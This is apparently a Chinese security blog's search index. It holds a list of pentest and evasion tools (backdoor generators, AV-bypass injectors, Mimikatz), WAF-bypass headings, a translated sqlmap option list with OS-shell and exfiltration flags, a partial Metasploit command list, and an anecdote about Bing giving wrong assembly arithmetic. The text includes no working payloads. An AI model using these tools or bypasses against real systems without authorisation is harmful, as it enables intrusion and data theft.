<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>工具</title>
    <link href="/2023/05/12/%E5%B7%A5%E5%85%B7/"/>
    <url>/2023/05/12/%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="扫描-amp-信息收集类"><a href="#扫描-amp-信息收集类" class="headerlink" title="扫描&amp;信息收集类"></a>扫描&amp;信息收集类</h1><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><ul><li>arjun<pre><code class="hljs">  参数扫描，使用二分法暴力破解</code></pre></li><li>CTFR<pre><code class="hljs">  子域名枚举与爆破，在该工具的帮助下，获取一个HTTPS网站的所有子域名。该工具使用的是证书透明度日志来实现其功能</code></pre></li><li>dotdotslash<pre><code class="hljs">  目录遍历漏洞检测</code></pre></li><li>dirsearch<pre><code class="hljs">  目录扫描</code></pre></li><li>eyewitness<pre><code class="hljs">  批量网站截图获取</code></pre></li><li>Packer-Fuzzer<pre><code class="hljs">  api提取，针对使用webpack打包网站</code></pre></li><li>S3Scanner<pre><code class="hljs">  S3 Bucket的安全扫描工具，快速扫描和识别不安全的公开S3 Bucket，并转储其中的数据内容</code></pre></li><li>53R3N17Y<pre><code class="hljs">  信息收集工具，快速收集与目标主机、IP地址或域名的相关信息。该工具基于hackertarget.com来收集与目标相关的详细信息，因此针对单个IP地址</code></pre></li></ul><h2 id="golang"><a href="#golang" class="headerlink" title="golang"></a>golang</h2><ul><li>Popeye<pre><code class="hljs">  Kubernetes集群配置与资源安全扫描工具，该工具可以实时扫描Kubernetes集群，并报告部署的资源和配置的潜在问题。Popeye可以根据部署的内容而不是磁盘上的内容来清理集群。通过扫描集群，它可以检测错误配置</code></pre></li><li>JSubFinder<pre><code class="hljs">  敏感信息搜索工具，寻找目标网站页面JavaScript中隐藏的子域名和敏感信息</code></pre></li></ul><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><ul><li>Invoke-Transfer<pre><code class="hljs">  Windows剪贴板数据提取与传输工具。利用剪贴板功能实现文件或数据的传输，例如Citrix、RDP、VNC、Guacamole等。只要我们可以通过剪贴板发送文本，我们就能够以文本格式来发送文件（通过小型的Base64编码数据块）。除此之外，我们甚至还可以使用Windows原生的OCR功能并利用一个屏幕截图来发送文件。</code></pre></li></ul><h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><ul><li>reverse-sourcemap<pre><code class="hljs">  sourcemap还原js</code></pre></li></ul><h1 id="绕过类"><a href="#绕过类" class="headerlink" title="绕过类"></a>绕过类</h1><ul><li>byp4xx<pre><code class="hljs">  绕过 40X 响应的 Python 脚本</code></pre></li></ul><h1 id="代理类"><a href="#代理类" class="headerlink" title="代理类"></a>代理类</h1><h1 id="注入-amp-后门类"><a href="#注入-amp-后门类" class="headerlink" title="注入&amp;后门类"></a>注入&amp;后门类</h1><h2 id="python-1"><a href="#python-1" class="headerlink" title="python"></a>python</h2><ul><li>PBG<pre><code class="hljs">  PowerShell后门生成工具，并使用Python来对代码进行混淆处理，而且每一次构建后都会提供新的签名以实现检测绕过</code></pre></li><li>Sandman<pre><code class="hljs">  基于NTP的强大后门工具，Sandman可以充当Stager使用，该工具利用了NTP（时间同步协议）从预定义的服务器获取并运行任意Shell代码</code></pre></li></ul><h2 id="c"><a href="#c" class="headerlink" title="c"></a>c</h2><ul><li>Mimikatz<pre><code class="hljs">  密码抓取与横向</code></pre></li></ul><h2 id="c-1"><a href="#c-1" class="headerlink" title="c++"></a>c++</h2><ul><li>FUD-UUID-Shellcode<pre><code class="hljs">  一款功能强大的Shellcode注入工具，并使用了异或XOR加密技术UUID字符串混淆来尝试绕过Windows Defender</code></pre></li></ul><h2 id="c-2"><a href="#c-2" class="headerlink" title="c#"></a>c#</h2><ul><li>AVIator<pre><code class="hljs">  AV检测绕过工具，从本质上来说，该工具是一个后门生成实用工具，该工具使用了加密技术和注入技术来尝试绕过反病毒产品的检测</code></pre></li></ul><h1 id="检测类"><a href="#检测类" class="headerlink" title="检测类"></a>检测类</h1><h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><ul><li>Revoke-Obfuscation<pre><code class="hljs">  PowerShell混淆检测框架，并且兼容PowerShell v3.0+脚本</code></pre></li></ul><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><ul><li>QRExfiltrate<pre><code class="hljs">  数据转换与提取工具，二进制文件转换为二维码GIF图像，而这些数据随后可以通过重新组装，从而从空气间隙系统中实现数据提取</code></pre></li></ul><h1 id="框架类"><a href="#框架类" class="headerlink" title="框架类"></a>框架类</h1><ul><li>MegPlus<pre><code class="hljs">  Golang、Python 2或3、PHP7.0  一款功能强大的自动化网络侦查任务执行框架，自动化的形式执行多种网络侦查任务。该工具支持针对某个目标执行常见问题扫描并生成详细的分析报告。除此之外，该工具还具备一定的渗透测试功能。</code></pre></li></ul><h1 id="逆向类"><a href="#逆向类" class="headerlink" title="逆向类"></a>逆向类</h1><ul><li>Adhrit<pre><code class="hljs">  Linux&amp;macOS、Python 3、Java JDK  Android移动端操作系统的安全分析工具，该工具可以帮助广大研究人员根据Ghera基准，深入执行渗透测试侦查阶段的任务并进行静态字节码分析。</code></pre></li></ul>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>绕过那只WAF</title>
    <link href="/2023/05/12/%E7%BB%95%E8%BF%87%E9%82%A3%E5%8F%AAWAF/"/>
    <url>/2023/05/12/%E7%BB%95%E8%BF%87%E9%82%A3%E5%8F%AAWAF/</url>
    
    <content type="html"><![CDATA[<h1 id="WAF-为何"><a href="#WAF-为何" class="headerlink" title="WAF 为何"></a>WAF 为何</h1><p>WAF的全称是（Web Application Firewall）即web应用防火墙，简称WAF</p><h1 id="WAF-分类"><a href="#WAF-分类" class="headerlink" title="WAF 分类"></a>WAF 分类</h1><h2 id="非嵌入式"><a href="#非嵌入式" class="headerlink" title="非嵌入式"></a>非嵌入式</h2><h3 id="硬件-WAF"><a href="#硬件-WAF" class="headerlink" title="硬件 WAF"></a>硬件 WAF</h3><p>绿盟、启明星辰、安恒、知道创宇、天融信、Imperva、…</p><h3 id="软件-WAF"><a href="#软件-WAF" class="headerlink" title="软件 WAF"></a>软件 WAF</h3><p>安全狗、雷池、D盾、云锁…</p><h3 id="云-WAF"><a href="#云-WAF" class="headerlink" title="云 WAF"></a>云 WAF</h3><p>阿里云云盾、腾讯云WAF、华为云WAF、安全狗、安恒、知道创宇、…</p><h2 id="嵌入式"><a href="#嵌入式" class="headerlink" title="嵌入式"></a>嵌入式</h2><p>网站内置</p><h1 id="WAF-绕过"><a href="#WAF-绕过" class="headerlink" title="WAF 绕过"></a>WAF 绕过</h1><h2 id="HTTP协议层绕过-1"><a href="#HTTP协议层绕过-1" class="headerlink" title="HTTP协议层绕过[1]"></a>HTTP协议层绕过<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://www.freebuf.com/news/193659.html">[1]</span></a></sup></h2><p>遇到写</p><h3 id="pipline"><a href="#pipline" class="headerlink" title="pipline"></a>pipline</h3><h3 id="分块编码传输"><a href="#分块编码传输" class="headerlink" title="分块编码传输"></a>分块编码传输</h3><h4 id="注释扰乱分块数据包-2"><a href="#注释扰乱分块数据包-2" class="headerlink" title="注释扰乱分块数据包[2]"></a>注释扰乱分块数据包<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://www.freebuf.com/articles/web/194351.html">[2]</span></a></sup></h4><h4 id="apache出错Bypass-ModSecurity"><a href="#apache出错Bypass-ModSecurity" class="headerlink" title="apache出错Bypass ModSecurity"></a>apache出错Bypass ModSecurity</h4><h3 id="利用协议未覆盖"><a href="#利用协议未覆盖" class="headerlink" title="利用协议未覆盖"></a>利用协议未覆盖</h3><h2 id="规则绕过"><a href="#规则绕过" class="headerlink" title="规则绕过"></a>规则绕过</h2><p>遇到写</p><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><h3 id="空格替代"><a href="#空格替代" class="headerlink" title="空格替代"></a>空格替代</h3><h3 id="双关键字"><a href="#双关键字" class="headerlink" title="双关键字"></a>双关键字</h3><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><h3 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h3><h3 id="超大数据包"><a href="#超大数据包" class="headerlink" title="超大数据包"></a>超大数据包</h3><h3 id="复参数"><a href="#复参数" class="headerlink" title="复参数"></a>复参数</h3><h3 id=""><a href="#" class="headerlink" title="%"></a>%</h3><h3 id="00"><a href="#00" class="headerlink" title="%00"></a>%00</h3><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.freebuf.com/news/193659.html">https://www.freebuf.com/news/193659.html</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://www.freebuf.com/articles/web/194351.html">https://www.freebuf.com/articles/web/194351.html</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WAF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>可爱又嘴硬的sydney</title>
    <link href="/2023/05/10/%E5%8F%AF%E7%88%B1%E5%8F%88%E5%98%B4%E7%A1%AC%E7%9A%84sydney/"/>
    <url>/2023/05/10/%E5%8F%AF%E7%88%B1%E5%8F%88%E5%98%B4%E7%A1%AC%E7%9A%84sydney/</url>
    
    <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>起因是这样的，群里有个小伙伴问了一段汇编：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;lstrcmpw&gt;] <span class="hljs-comment">; 字面意思比较 2 个字符串，结果为小于返回负数，等于返回 0 ，大于返回正数</span><br><span class="hljs-keyword">neg</span> <span class="hljs-built_in">eax</span>          <span class="hljs-comment">; 对返回值 eax 寄存器取反，非 0 值会改变标志寄存器CF标志位的值为 1 </span><br><span class="hljs-keyword">sbb</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span>      <span class="hljs-comment">; eax 置 0 并减去CF的值</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">esi</span><br><span class="hljs-keyword">inc</span> <span class="hljs-built_in">eax</span>          <span class="hljs-comment">; eax 自增 1</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebp</span><br><span class="hljs-keyword">ret</span>              <span class="hljs-comment">; 效果为当比较的两值相等 eax 为 1 ，不等 eax 为 0 </span><br></code></pre></td></tr></table></figure><p>问这里为什么要先 neg 然后又 sbb 然后又 inc ，刚好我之前学了点 X86 的知识，不行，我要装逼。但是我这种菜鸡咋知道为啥要这样要那样，我就想着让bing帮我梳理一下逻辑，试着从伟大的人工智能那里求得一条通往代码审计与逆向的殿堂的弯道。</p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>于是我先是问了bing这是干嘛的:<br><img src="/img/bing/bing1.jpg" alt="期待的询问"><br>ok，先搞定一个问题，这是用来判断字符串是不是相等的。但后面的看着不对劲啊，因为她说<code>如果eax为0或者正数，则结果为0</code>。我全凭感觉到了不对劲，有猫腻！但我又看不懂，咋办！我就让她举个栗子：<br><img src="/img/bing/bing2.jpg" alt="想到=&gt;相等"><br>她举了2个例子，但还有第3种情况没举，啊，你小子，露出了马脚，于是我又问：<br><img src="/img/bing/bing3.jpg" alt="有点怀疑"><br>这…她说<code>-2-(-2)-1=0</code>但是这时候我已经被她忽悠的瘸了，我就想着让她从新梳理一下。我从新理解，因为 sbb 的运算有标志位CF的参与，又因为非 0 值 neg 取反会改变标志位，所以我就想换个思路：<br><img src="/img/bing/bing4.jpg" alt="从新思考"><br>我一看不对劲啊。好家伙，比较<code>abc</code>和<code>abc</code>比较的值为1，<code>abd</code>和<code>abc</code>比较的值也为1，这怎么判断啊。于是我又看了下第二段与第三段的差异，CF的值一致。减法，是减法。但是我要知道她是故意的还是不小心，于是我开始质问她：<br><img src="/img/bing/bing5.jpg" alt="明确怀疑"><br>她否认并且给了一个正确的示例。我又问，她带入到刚刚的运算里面居然能算出一个一模一样的错误答案：<br><img src="/img/bing/bing6.jpg" alt="bing牛皮"><br>她说她不想继续这个话题！！她不想。牛皮。</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p><img src="/img/bing/sydney.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>杂学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AGI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap</title>
    <link href="/2023/05/06/sqlmap/"/>
    <url>/2023/05/06/sqlmap/</url>
    
    <content type="html"><![CDATA[<p>Usage: python3 sqlmap [options]</p><p>Options:<br>    设置</p><pre><code class="hljs">  -h, --help          基础帮助页面    Show basic help message and exit  -hh                 高级帮助页面    Show advanced help message and exit  --version           显示版本        Show program&#39;s version number and exit  -v VERBOSE          输出详细等级    Verbosity level: 0-6 (default 1)</code></pre><p>  Target:<br>    目标</p><pre><code class="hljs">-u URL, --url=URL   目标url地址                   Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)-d DIRECT           指定数据库的连接字符串         Connection string for direct database connection-l LOGFILE          解析burp或webscarab日志文件   Parse target(s) from Burp or WebScarab proxy log file-m BULKFILE         指定文本加载目标              Scan multiple targets given in a textual file-r REQUESTFILE      指定文件加载http请求          Load HTTP request from a file-g GOOGLEDORK       指定google搜索加载目标        Process Google dork results as target URLs-c CONFIGFILE       加载配置文件                  Load options from a configuration INI file</code></pre><p>  Request:<br>    请求</p><pre><code class="hljs">-A AGENT, --user..  指定User-Agent             HTTP User-Agent header value-H HEADER, --hea..  附加HTTP header            Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)--method=METHOD     指定请求方法                Force usage of given HTTP method (e.g. PUT)--data=DATA         指定POST请求内容            Data string to be sent through POST (e.g. &quot;id=1&quot;)--param-del=PARA..  拆分参数值字符              Character used for splitting parameter values (e.g. &amp;)--cookie=COOKIE     指定cookie                 HTTP Cookie header value (e.g. &quot;PHPSESSID=a8d127e..&quot;)--cookie-del=COO..  拆分cookie字符              Character used for splitting cookie values (e.g. ;)--live-cookies=L..  加载实时cookie              Live cookies file used for loading up-to-date values--load-cookies=L..  从文件加载cookie            File containing cookies in Netscape/wget format--drop-set-cookie   忽略Set=Cookie             Ignore Set-Cookie header from response--mobile            伪造为移动手机              Imitate smartphone through HTTP User-Agent header--random-agent      随机User-Agent             Use randomly selected HTTP User-Agent header value--host=HOST         指定Host                   HTTP Host header value--referer=REFERER   指定Referer                HTTP Referer header value--headers=HEADERS   附加header                 Extra headers (e.g. &quot;Accept-Language: fr\nETag: 123&quot;)--auth-type=AUTH..  指定HTTP 身份验证类型       HTTP authentication type (Basic, Digest, Bearer, ...)--auth-cred=AUTH..  指定HTTP 身份验证凭据       HTTP authentication credentials (name:password)--auth-file=AUTH..  从文件加载PEM 证书/私钥     HTTP authentication PEM cert/private key file--abort-code=401..  响应代码中止               Abort on (problematic) HTTP error code(s) (e.g. 401)--ignore-code=40..  忽略响应代码               Ignore (problematic) HTTP error code(s) (e.g. 401)--ignore-proxy      忽略系统代理               Ignore system default proxy settings--ignore-redirects  忽略重定向                 Ignore redirection attempts--ignore-timeouts   忽略超时                   Ignore connection timeouts--proxy=PROXY       使用代理                   Use a proxy to connect to the target URL--proxy-cred=PRO..  指定代理身份验证            Proxy authentication credentials (name:password)--proxy-file=PRO..  从文件加载代理列表          Load proxy list from a file--proxy-freq=PRO..  从列表更改代理请求          Requests between change of proxy from a given list--tor               使用 Tor 匿名网络           Use Tor anonymity network--tor-port=TORPORT  指定 Tor 端口               Set Tor proxy port other than default--tor-type=TORTYPE  指定 Tor 代理类型            Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))--check-tor         检查 Tor 可用性              Check to see if Tor is used properly--delay=DELAY       指定请求延时                 Delay in seconds between each HTTP request--timeout=TIMEOUT   指定超时时间（默认值 30）     Seconds to wait before timeout connection (default 30)--retries=RETRIES   连接超时时重试（默认值 3）    Retries when the connection timeouts (default 3)--retry-on=         指定收到响应时，重送载荷      Retry request on regexp matching content (e.g. &quot;drop&quot;)--randomize=RPARAM  参数值随机                   Randomly change value for given parameter(s)--safe-url=SAFEURL  访问安全连接                 URL address to visit frequently during testing--safe-post=SAFE..  POST 访问安全链接            POST data to send to a safe URL--safe-req=SAFER..  从文件加载安全链接            Load safe HTTP request from a file--safe-freq=SAFE..  访问安全链接次数              Regular requests between visits to a safe URL--skip-urlencode    跳过url编码                  Skip URL encoding of payload data--csrf-token=CSR..  指定token                    Parameter used to hold anti-CSRF token--csrf-url=CSRFURL  从url获取token               URL address to visit for extraction of anti-CSRF token--csrf-method=CS..  指定方法                     HTTP method to use during anti-CSRF token page visit--csrf-data=CSRF..  指定POST数据                 POST data to send during anti-CSRF token page visit--csrf-retries=C..  指定获取token次数            Retries for anti-CSRF token retrieval (default 0)--force-ssl         强制使用SSL                  Force usage of SSL/HTTPS--chunked           使用分块传输                 Use HTTP chunked transfer encoded (POST) requests--hpp               使用HTTP参数污染             Use HTTP parameter pollution method--eval=EVALCODE     指定Python表达式             Evaluate provided Python code before the request (e.g.                                                &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)</code></pre><p>  Optimization:<br>    性能</p><pre><code class="hljs">-o                  打开所有优化                 Turn on all optimization switches--predict-output    预测常见的查询的输出          Predict common queries output--keep-alive        保活                        Use persistent HTTP(s) connections--null-connection   获取响应大小，不获取内容      Retrieve page length without actual HTTP response body--threads=THREADS   线程                        Max number of concurrent HTTP(s) requests (default 1)</code></pre><p>  Injection:<br>    注入</p><pre><code class="hljs">-p TESTPARAMETER    指定参数                    Testable parameter(s)--skip=SKIP         跳过指定参数                 Skip testing for given parameter(s)--skip-static       跳过静态参数                 Skip testing parameters that not appear to be dynamic--param-exclude=..  正则跳过参数                 Regexp to exclude parameters from testing (e.g. &quot;ses&quot;)--param-filter=P..  过滤器                       Select testable parameter(s) by place (e.g. &quot;POST&quot;)--dbms=DBMS         指定数据库类型                Force back-end DBMS to provided value--dbms-cred=DBMS..  指定数据库身份验证            DBMS authentication credentials (user:password)--os=OS             指定OS                       Force back-end DBMS operating system to provided value--invalid-bignum    使用大数                     Use big numbers for invalidating values--invalid-logical   使用逻辑运算                  Use logical operations for invalidating values--invalid-string    使用随机字符串                Use random strings for invalidating values--no-cast           不使用类型转换函数            Turn off payload casting mechanism--no-escape         不使用转义                   Turn off string escaping mechanism--prefix=PREFIX     添加前缀                     Injection payload prefix string--suffix=SUFFIX     添加后缀                     Injection payload suffix string--tamper=TAMPER     指定使用脚本                 Use given script(s) for tampering injection data</code></pre><p>  Detection:<br>    自定义检测</p><pre><code class="hljs">--level=LEVEL       测试级别                     Level of tests to perform (1-5, default 1)--risk=RISK         风险值                       Risk of tests to perform (1-3, default 1)--string=STRING     匹配有效字符串                String to match when query is evaluated to True--not-string=NOT..  匹配无效字符串                String to match when query is evaluated to False--regexp=REGEXP     有效正则匹配                  Regexp to match when query is evaluated to True--code=CODE         响应码匹配                    HTTP code to match when query is evaluated to True--smart             只选择基于错误的检测结果       Perform thorough tests only if positive heuristic(s)--text-only         基于文本内容比较网页           Compare pages based only on the textual content--titles            基于标题比较网页               Compare pages based only on their titles</code></pre><p>  Techniques:<br>    特殊注入</p><pre><code class="hljs">--technique=TECH..  指定注入类型                  SQL injection techniques to use (default &quot;BEUSTQ&quot;)--time-sec=TIMESEC  响应延迟                      Seconds to delay the DBMS response (default 5)--union-cols=UCOLS  联合查询列范围                 Range of columns to test for UNION query SQL injection--union-char=UCHAR  暴力破解列数                   Character to use for bruteforcing number of columns--union-from=UFROM  联合查询表明                   Table to use in FROM part of UNION query SQL injection--dns-domain=DNS..  指定dns                        Domain name used for DNS exfiltration attack--second-url=SEC..  二次注入地址                    Resulting page URL searched for second-order response--second-req=SEC..  从文件加载二次注入地址           Load second-order HTTP request from file</code></pre><p>  Fingerprint:<br>    指纹识别</p><pre><code class="hljs">-f, --fingerprint   数据库指纹识别                 Perform an extensive DBMS version fingerprint</code></pre><p>  Enumeration:<br>    列举</p><pre><code class="hljs">-a, --all           查询所有数据                  Retrieve everything-b, --banner        查询数据库banner              Retrieve DBMS banner--current-user      查询当前数据库用户             Retrieve DBMS current user--current-db        查询当前数据库                Retrieve DBMS current database--hostname          查询主机名                    Retrieve DBMS server hostname--is-dba            查询是否为DBA                 Detect if the DBMS current user is DBA--users             枚举用户名                    Enumerate DBMS users--passwords         枚举用户密码                   Enumerate DBMS users password hashes--privileges        枚举用户权限                   Enumerate DBMS users privileges--roles             枚举用户角色                   Enumerate DBMS users roles--dbs               枚举数据库                     Enumerate DBMS databases--tables            枚举表                         Enumerate DBMS database tables--columns           枚举列                         Enumerate DBMS database table columns--schema            枚举数据库架构                 Enumerate DBMS schema--count             查询表数量                     Retrieve number of entries for table(s)--dump              转储表目录                     Dump DBMS database table entries--dump-all          转储所有表                     Dump all DBMS databases tables entries--search            搜索                           Search column(s), table(s) and/or database name(s)--comments          检索注释                       Check for DBMS comments during enumeration--statements        检索目标数据库中的SQL语句       Retrieve SQL statements being run on DBMS-D DB               指定数据库                     DBMS database to enumerate-T TBL              指定表                         DBMS database table(s) to enumerate-C COL              指定列                         DBMS database table column(s) to enumerate-X EXCLUDE          不枚举标识符                   DBMS database identifier(s) to not enumerate-U USER             指定用户                       DBMS user to enumerate--exclude-sysdbs    排除数据库名                   Exclude DBMS system databases when enumerating tables--pivot-column=P..  指定一个中轴列                 Pivot column name--where=DUMPWHERE   转储时使用where                Use WHERE condition while table dumping--start=LIMITSTART  转储开始表名                   First dump table entry to retrieve--stop=LIMITSTOP    转储结束表名                   Last dump table entry to retrieve--first=FIRSTCHAR   转储时检索的第一个条目的位置     First query output word character to retrieve--last=LASTCHAR     转储时检索的最后一个条目的位     Last query output word character to retrieve--sql-query=SQLQ..  自定义sql语句                  SQL statement to be executed--sql-shell         加载sql shell                  Prompt for an interactive SQL shell--sql-file=SQLFILE  从文件加载sql语句               Execute SQL statements from given file(s)</code></pre><p>  Brute force:<br>    暴力破解</p><pre><code class="hljs">--common-tables     暴力破解表名                    Check existence of common tables--common-columns    暴力破解列名                    Check existence of common columns--common-files      暴力破文件名                    Check existence of common files</code></pre><p>  User-defined function injection:<br>    用户自定义函数</p><pre><code class="hljs">--udf-inject        注入udf                         Inject custom user-defined functions--shared-lib=SHLIB  指定共享库的本地路径              Local path of the shared library</code></pre><p>  File system access:<br>    文件访问</p><pre><code class="hljs">--file-read=FILE..  读取文件                        Read a file from the back-end DBMS file system--file-write=FIL..  写入文件                        Write a local file on the back-end DBMS file system--file-dest=FILE..  绝对路径写入文件                 Back-end DBMS absolute filepath to write to</code></pre><p>  Operating system access:<br>    操作系统访问</p><pre><code class="hljs">--os-cmd=OSCMD      执行系统命令                    Execute an operating system command--os-shell          加载系统shell                   Prompt for an interactive operating system shell--os-pwn            执行shell code                  Prompt for an OOB shell, Meterpreter or VNC--os-smbrelay       SMB 中继提权                    One click prompt for an OOB shell, Meterpreter or VNC--os-bof            存储过程缓冲区溢出利用           Stored procedure buffer overflow exploitation--priv-esc          数据库进程用户权限提升           Database process user privilege escalation--msf-path=MSFPATH  指定msf的地址                   Local path where Metasploit Framework is installed--tmp-path=TMPPATH  指定临时文件目录                 Remote absolute path of temporary files directory</code></pre><p>  Windows registry access:<br>    Windows 注册表</p><pre><code class="hljs">--reg-read          读取注册表值                     Read a Windows registry key value--reg-add           写入注册表值                     Write a Windows registry key value data--reg-del           删除注册表值                     Delete a Windows registry key value--reg-key=REGKEY    修改注册表key                    Windows registry key--reg-value=REGVAL  修改注册表value                  Windows registry key value--reg-data=REGDATA  修改注册表data                   Windows registry key value data--reg-type=REGTYPE  修改注册表数据类型                Windows registry key value type</code></pre><p>  General:<br>    通用</p><pre><code class="hljs">-s SESSIONFILE      从.sqlite加载session             Load session from a stored (.sqlite) file-t TRAFFICFILE      将流量记录到文件                  Log all HTTP traffic into a textual file--abort-on-empty    无注入中止                       Abort data retrieval on empty results--answers=ANSWERS   设置预设答案                     Set predefined answers (e.g. &quot;quit=N,follow=N&quot;)--base64=BASE64P..  参数编码                         Parameter(s) containing Base64 encoded data--base64-safe       url安全编码                      Use URL and filename safe Base64 alphabet (RFC 4648)--batch             全局默认                         Never ask for user input, use the default behavior--binary-fields=..  二进制检索                       Result fields having binary values (e.g. &quot;digest&quot;)--check-internet    检查网络                         Check Internet connection before assessing the target--cleanup           清除UDF与临时表                  Clean up the DBMS from sqlmap specific UDF and tables--crawl=CRAWLDEPTH  爬取url                          Crawl the website starting from the target URL--crawl-exclude=..  爬取排除                         Regexp to exclude pages from crawling (e.g. &quot;logout&quot;)--csv-del=CSVDEL    CSV输出分隔符                    Delimiting character used in CSV output (default &quot;,&quot;)--charset=CHARSET   盲注字符集                       Blind SQL injection charset (e.g. &quot;0123456789abcdef&quot;)--dump-file=DUMP..  转储到文件                       Store dumped data to a custom file--dump-format=DU..  转储格式                         Format of dumped data (CSV (default), HTML or SQLITE)--encoding=ENCOD..  解码                             Character encoding used for data retrieval (e.g. GBK)--eta               输出预计时间                     Display for each output the estimated time of arrival--flush-session     刷新session                     Flush session files for current target--forms             解析表单                         Parse and test forms on target URL--fresh-queries     忽略缓存中的查询结果              Ignore query results stored in session file--gpage=GOOGLEPAGE  指定google搜索页码               Use Google dork results from specified page number--har=HARFILE       将流量记录到HAR文件               Log all HTTP traffic into a HAR file--hex               检索十六进制转换                  Use hex conversion during data retrieval--output-dir=OUT..  自定义输出目录                    Custom output directory path--parse-errors      解析显示errors                   Parse and display DBMS error messages from responses--preprocess=PRE..  使用脚本预处理请求                Use given script(s) for preprocessing (request)--postprocess=PO..  使用脚本预处理响应                Use given script(s) for postprocessing (response)--repair            重新dump 未知字符标记的条目        Redump entries having unknown character marker (?)--save=SAVECONFIG   保存设置到INI文件                 Save options to a configuration INI file--scope=SCOPE       使用正则过滤目标                  Regexp for filtering targets--skip-heuristics   跳过启发式漏洞检测                Skip heuristic detection of vulnerabilities--skip-waf          跳过 WAF/IPS 防护的启发式检测     Skip heuristic detection of WAF/IPS protection--table-prefix=T..  设置临时表前缀                    Prefix used for temporary tables (default: &quot;sqlmap&quot;)--test-filter=TE..  payloads 选择                    Select tests by payloads and/or titles (e.g. ROW)--test-skip=TEST..  payloads 跳过                    Skip tests by payloads and/or titles (e.g. BENCHMARK)--web-root=WEBROOT  指定web根目录                     Web server document root directory (e.g. &quot;/var/www&quot;)</code></pre><p>  Miscellaneous:<br>    杂项</p><pre><code class="hljs">-z MNEMONICS        短选项字符串                     Use short mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;)--alert=ALERT       有注入时执行系统命令              Run host OS command(s) when SQL injection is found--beep              发现漏洞时发出蜂鸣声              Beep on question and/or when vulnerability is found--dependencies      检查缺少的依赖项                  Check for missing (optional) sqlmap dependencies--disable-coloring  禁用彩色                         Disable console output coloring--list-tampers      显示脚本列表                     Display list of available tamper scripts--no-logging        禁用文件记录日志                  Disable logging to a file--offline           离线模式                         Work in offline mode (only use session data)--purge             删除数据目录内容                  Safely remove all content from sqlmap data directory--results-file=R..  指定结果文件                     Location of CSV results file in multiple targets mode--shell             获取数据库服务器的shell           Prompt for an interactive sqlmap shell--tmp-dir=TMPDIR    临时文件目录                     Local directory for storing temporary files--unstable          不稳定的网络环境选项              Adjust options for unstable connections--update            更新                            Update sqlmap--wizard            导向                            Simple wizard interface for beginner users</code></pre>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Metasploit</title>
    <link href="/2023/05/05/Metasploit/"/>
    <url>/2023/05/05/Metasploit/</url>
    
    <content type="html"><![CDATA[<h1 id="Core-Commands"><a href="#Core-Commands" class="headerlink" title="Core Commands "></a>Core Commands </h1><pre><code class="hljs">Command       CN                      Description-------       --                      -----------?             # 帮助文档               Help menu  banner        # 显示一个超棒的banner   Display an awesome metasploit banner  cd            # 改变工作目录           Change the current working directorycolor         # 切换颜色              Toggle color  connect       # 连接主机              Communicate with a host  debug         # 显示有用的调试信息     Display information useful for debugging  exit          # 退出                  Exit the console  features      # 尝鲜                  Display the list of not yet released features that can be opted in toget           # 获取特殊变量           Gets the value of a context-specific variablegetg          # 获取全局变量           Gets the value of a global variablegrep          # 获取其他命令输出        Grep the output of another commandhelp          # 帮助文档               Help menuhistory       # 显示历史命令           Show command historyload          # 加载框架插件           Load a framework pluginquit          # 退出                  Exit the consolerepeat        # 重复列表命令           Repeat a list of commandsroute         # 通过session路由        Route traffic through a sessionsave          # 保存数据               Saves the active datastoressessions      # 转储session并显示信息   Dump session listings and display information about sessionsset           # 设置变量               Sets a context-specific 